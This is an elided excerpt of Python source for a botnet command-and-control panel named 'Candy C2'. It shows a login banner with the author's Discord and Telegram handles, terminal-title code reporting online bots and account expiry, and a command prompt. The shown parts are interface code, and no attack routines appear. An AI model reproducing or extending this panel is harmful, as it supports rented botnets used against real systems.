...
bannerLogin = '''
            ( Discord: gghosttyy )
          ( Telegram: t.me/DevS1ake )
        Thank you for using Candy C2
'''
...
def handle_client(client, address):
    send(client, "\33]0;Candy C2 | Login\a")
    send(client, f'\x1bCandy C2 | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
...
def update_title(client, name, expires):
    while 1:
        try:
            send(client, f"\33]0;[/] Candy C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires}\a", False)
            time.sleep(1)
            send(client, f"\33]0;[-] Candy C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires}\a", False)
            time.sleep(1)
            send(client, f"\33]0;[\] Candy C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires}\a", False)
...
def command_line(client, username):
    ...
    prompt = f'{color("LIGHTBLSYN_EX")}({color("WHITE")}Candy{color("LIGHTBLSYN_EX")}@{color("CYAN")}{username}{color("LIGHTBLSYN_EX")}) > {color("LIGHTBLSYN_EX")}'
